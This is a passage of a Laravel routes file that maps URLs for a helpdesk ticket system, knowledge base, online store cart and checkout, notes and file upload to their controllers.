        Route::get('getstatus', 'LeadviewController@getstatus');

        Route::get('documentdownload', 'DocumentController@download');

        Route::get('download/{name}', 'DocumentController@getDownload');

        // Route::get('sales', 'productController@sales');

    

        #ticket center

        Route::resource('helpdesk/kb/article', 'Helpdesk\kb\Knowledgebase');

        /*  For the datatable of article  */

        Route::get('helpdesk/kb/articles/data', ['as' => 'api.article', 'uses' => 'Helpdesk\kb\Knowledgebase@data']);



        Route::get('helpdesk/kb/article/delete/{slug}', 'Helpdesk\kb\Knowledgebase@destroy');

    

        Route::get('helpdesk/kb/article/{id}/view', 'Helpdesk\kb\Knowledgebase@view');

   

        Route::get('helpdesk/kb/article/show/{name}', 'Helpdesk\kb\Knowledgebase@show');



        /**

         * Dashboard

         */

        Route::get('/helpdesk/tickets-dashboard', 'Helpdesk\Ticket\TicketsController@index');

        /**

         * All Tickets

         * Using query param,

         */

        Route::resource('helpdesk/ticket', 'Helpdesk\Ticket\TicketsController');

        Route::get('helpdesk/tickets/data', 'Helpdesk\Ticket\TicketsController@data');

        Route::get('helpdesk/ticket/delete/{slug}', 'Helpdesk\Ticket\TicketsController@destroy');

        // Route::get('/helpdesk/tickets/tickets', 'TicketsController@tickets');

        Route::post('helpdesk/ticket/reply/', 'Helpdesk\Ticket\TicketsController@ticketReplyPost');

    

        Route::get('helpdesk/tickets/overdue/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/open/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/closed/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/resolved/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/add/', 'Helpdesk\Ticket\TicketsController@index');

        /**

         * Ticket functions

         */

        //Change status

        Route::get('helpdesk/tickets/ticket/change-status/', 'Helpdesk\Ticket\TicketsController@changeStatus');

        //Change priority

        Route::get('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changePriority');

        //Change owner

        Route::patch('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changeOwner');

        /**

         * Departments     *

         */

    

        /*  For the crud of department  */

        Route::resource('helpdesk/tickets/department', 'Helpdesk\Ticket\TicketsDepartmentsController');

        Route::get('helpdesk/tickets/departments/destroy/{id}', 'Helpdesk\Ticket\TicketsDepartmentsController@destroy');

        /*  For the datatable of article  */

        Route::get('/helpdesk/tickets/departments/data', 'Helpdesk\Ticket\TicketsDepartmentsController@data');

        /**

         * Categories    *

         */

        /*  For the crud of department  */

        Route::resource('helpdesk/tickets/category', 'Helpdesk\Ticket\TicketsCategoriesController');

        Route::get('helpdesk/tickets/categories/destroy/{id}', 'Helpdesk\Ticket\TicketsCategoriesController@destroy');

        /*  For the datatable of article  */

        Route::get('/helpdesk/tickets/categories/data', 'Helpdesk\Ticket\TicketsCategoriesController@data');

        /**

         * Canned Responses

         *

         */

        /*  For the crud of canned responses   */

        Route::resource('helpdesk/tickets/canned-response', 'Helpdesk\Ticket\TicketsCannedResponseController');

        Route::get('helpdesk/tickets/canned-responses/delete/{id}', 'Helpdesk\Ticket\TicketsCannedResponseController@destroy');

        /*  For the datatable of canned responses  */

        Route::get('/helpdesk/tickets/canned-responses/data', 'Helpdesk\Ticket\TicketsCannedResponseController@data');

        Route::post('helpdesk/tickets/canned-responses/get-canned-response', 'Helpdesk\Ticket\TicketsCannedResponseController@getCannedResponse');



        /*  For the crud of priority management   */

        Route::resource('/helpdesk/tickets/priority', 'Helpdesk\Ticket\TicketsPriorityController');

        Route::get('helpdesk/tickets/priorities/delete/{id}', 'Helpdesk\Ticket\TicketsPriorityController@destroy');

        Route::get('/helpdesk/tickets/priorities/data', 'Helpdesk\Ticket\TicketsPriorityController@data');

   



        /*  For the crud of ticket-type management   */

        Route::resource('/helpdesk/tickets/ticket-type', 'Helpdesk\Ticket\TicketsTypeController');

        Route::get('helpdesk/tickets/ticket-types/delete/{id}', 'Helpdesk\Ticket\TicketsTypeController@destroy');

        Route::get('/helpdesk/tickets/ticket-types/data', 'Helpdesk\Ticket\TicketsTypeController@data');



        // Route::resource('notes', 'NotesController');

        Route::get('leads', 'UserController@leads');

        // Route::get('onlinestore','productController@onlinestore');

        // Route::post('add_to_cart','productController@add_to_cart');

        // Route::post('shippingaddress','productController@shipping');

        // Route::post('shippingcreation','productController@shippingcreation');

        // Route::get('orderconfirm/{idencrypt}/{payment}','productController@orderconfirm');

        // Route::get('deletecart/{id}','productController@deletecart');

        // Route::get('sales','productController@sales');

        // Route::get('viewmore/{id}','productController@viewmore');

        Route::get('paypal/register', 'RegisterController@paypalReg');



        //impersonate



        Route::get('impersonate', 'UserController@impersonate');



         // Route::get('onlinestore_user', 'OnlineStoreController@onlinestore_user');

        //online store



        Route::get('onlinestore', 'OnlineStoreController@onlinestore');

        Route::get('onlinestore/{product}', 'OnlineStoreController@onlinestore');

        Route::post('add_to_cart', 'OnlineStoreController@add_to_cart');

        Route::post('shippingaddress', 'OnlineStoreController@shipping');

        Route::get('shippingaddress', 'OnlineStoreController@shipping');

        Route::post('shippingcreation', 'OnlineStoreController@shippingcreation');

        Route::get('orderconfirm/{idencrypt}/{payment}', 'OnlineStoreController@orderconfirm');

        Route::get('deletecart/{id}', 'OnlineStoreController@deletecart');

        Route::get('sales', 'OnlineStoreController@sales');

        Route::get('sales/data', 'OnlineStoreController@salesdata');

        Route::get('invoice/{id}', 'OnlineStoreController@viewmore');

        Route::get('onlinestores/{id}/{category}', 'OnlineStoreController@onlinestores');

        Route::post('updatecart', 'OnlineStoreController@updateCart');

        Route::get('viewcart', 'OnlineStoreController@viewCart');

        Route::get('clearcart', 'OnlineStoreController@clearCart');



        // notes

        Route::get('notes', 'NotesController@index');

        Route::post('postusernote', 'NotesController@postuserNote');

   

        Route::post('destroy-note', 'NotesController@destroy_note');



        // Route::get('upload_file', 'UserController@upload_file');

        Route::post('file_upload', 'UserController@file_upload');

    });

